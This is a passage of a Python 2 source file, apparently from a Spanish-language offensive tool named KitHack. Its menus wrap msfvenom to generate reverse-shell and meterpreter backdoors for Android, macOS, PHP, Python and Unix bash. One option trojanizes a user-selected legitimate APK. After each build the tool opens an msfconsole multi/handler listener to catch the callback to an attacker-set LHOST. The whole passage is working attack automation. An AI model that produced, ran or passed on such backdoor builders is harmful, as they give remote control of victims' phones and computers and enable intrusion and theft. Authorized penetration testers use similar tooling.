				a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
				
				if a == 1:
					os.system('python lib/network.py')
					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
					time.sleep(4)
					os.system('service postgresql start && msfvenom -p android/shell/reverse_tcp LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, OUT))																				
					location = os.getcwd()
					print("\033[1;32m")
					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:	
		   				print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))					
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
					else:
						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
			
				elif a == 2:
					os.system('python lib/network.py')
					LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
					Tk().withdraw()
					APK = tkFileDialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
					print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
					time.sleep(4)
					os.system('service postgresql start && msfvenom -x {0} -p android/shell/reverse_tcp LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, OUT))																				
					location = os.getcwd()
					print("\033[1;32m")
					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:	
		   				print("Backdoor guardado en {0}/output/{1}.apk".format(location, OUT))	
						if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
						else:
							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))					
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('service postgresql stop && clear')
							banner(), menu(), options()	
					else:
						print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()		

				else:
					print("{}\n[X] OPCION INVALIDA\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('clear')
					banner(), menu(), options()	

			else:
				print("\n{}[X] OPCION INVALIDA\n".format(RED))
				time.sleep(3)
				pause("{}Presione cualquier tecla para continuar...".format(GREEN))
				os.system('clear')
				banner(), menu(), options()	
												
		elif sys == 4:
			print '{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN)
			print '{0}[01]{1} osx/x64/meterpreter_reverse_http'.format(WHITE, YELLOW)
			print '{0}[02]{1} osx/x64/meterpreter_reverse_https'.format(WHITE, YELLOW)
			print '{0}[03]{1} osx/x64/meterpreter_reverse_tcp'.format(WHITE, YELLOW)
			print '{0}[04]{1} osx/x64/shell_reverse_tcp'.format(WHITE, YELLOW)
			print '{0}[05]{1} osx/x86/shell_reverse_tcp'.format(WHITE, YELLOW)

			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))

			if pay == 1:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p osx/x64/meterpreter_reverse_http LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.macho'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.macho".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()						

			elif pay == 2:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p osx/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.macho'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.macho".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()			

			elif pay == 3:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.macho'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.macho".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()											

			elif pay == 4:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p osx/x64/shell_reverse_tcp LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.macho'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.macho".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			elif pay == 5:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p osx/x86/shell_reverse_tcp LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.macho'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.macho".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x86/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	
			else:
				print("\n{}[X] OPCION INVALIDA\n".format(RED))
				time.sleep(3)
				pause("{}Presione cualquier tecla para continuar...".format(GREEN))
				os.system('clear')
				banner(), menu(), options()	

		elif sys == 5:
			print '{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN)
			print '{0}[01]{1} php/meterpreter_reverse_tcp'.format(WHITE, YELLOW)
			print '{0}[02]{1} php/reverse_php'.format(WHITE, YELLOW)

			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))

			if pay == 1:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p php/meterpreter_reverse_tcp LHOST={0} LPORT={1} R > output/{2}.php'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.php'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.php".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD php/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()					
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()						

			elif pay == 2:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p php/reverse_php LHOST={0} LPORT={1} R > output/{2}.php'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.php'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.php".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD php/reverse_php; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			else:
				print("\n{}[X] OPCION INVALIDA\n".format(RED))
				time.sleep(3)
				pause("{}Presione cualquier tecla para continuar...".format(GREEN))
				os.system('clear')
				banner(), menu(), options()	

		elif sys == 6:
			print '{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN)
			print '{0}[01]{1} python/meterpreter_reverse_http'.format(WHITE, YELLOW)
			print '{0}[02]{1} python/meterpreter_reverse_https'.format(WHITE, YELLOW)
			print '{0}[03]{1} python/meterpreter_reverse_tcp'.format(WHITE, YELLOW)
			print '{0}[04]{1} python/shell_reverse_tcp'.format(WHITE, YELLOW)
			print '{0}[05]{1} python/shell_reverse_tcp_ssl'.format(WHITE, YELLOW)
			print '{0}[06]{1} python/shell_reverse_udp'.format(WHITE, YELLOW)

			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))

			if pay == 1:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p python/meterpreter_reverse_http LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.py'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.py".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()								

			elif pay == 2:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p python/meterpreter_reverse_https LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.py'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.py".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()		

			elif pay == 3:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p python/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.py'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.py".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()									
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()		

			elif pay == 4:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p python/shell_reverse_tcp LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.py'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.py".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()				
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()	

			elif pay == 5:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p python/shell_reverse_tcp_ssl LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.py'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.py".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/shell_reverse_tcp_ssl; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()		

			elif pay == 6:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p python/shell_reverse_udp LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.py'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.py".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/shell_reverse_udp; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()		

			else:
				print("\n{}[X] OPCION INVALIDA\n".format(RED))
				time.sleep(3)
				pause("{}Presione cualquier tecla para continuar...".format(GREEN))
				os.system('clear')
				banner(), menu(), options()	

		elif sys == 7:
			print '{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN)
			print '{0}[01]{1} cmd/unix/reverse_bash'.format(WHITE, YELLOW)
			print '{0}[02]{1} cmd/unix/reverse_bash_telnet_ssl'.format(WHITE, YELLOW)

			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))

			if pay == 1:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p cmd/unix/reverse_bash LHOST={0} LPORT={1} -f raw > output/{2}.sh'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.sh'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.sh".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()						
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_bash; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()						

			elif pay == 2:
				os.system('python lib/network.py')
				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('service postgresql start && msfvenom -p cmd/unix/reverse_bash_telnet_ssl LHOST={0} LPORT={1} -f raw > output/{2}.sh'.format(LHOST, LPORT, OUT))																				
				location = os.getcwd()
				print("\033[1;32m")
				if os.stat('output/{}.sh'.format(OUT)).st_size != 0:
					print("Backdoor guardado en {0}/output/{1}.sh".format(location, OUT))	
					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
						os.system('service postgresql stop && clear')
						banner(), menu(), options()
					else:
						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_bash_telnet_ssl; exploit\'"'.format(LHOST, LPORT))
						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('service postgresql stop && clear')
						banner(), menu(), options()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('service postgresql stop && clear')
					banner(), menu(), options()		

			else:
				print("\n{}[X] OPCION INVALIDA\n".format(RED))
				time.sleep(3)
				pause("{}Presione cualquier tecla para continuar...".format(GREEN))
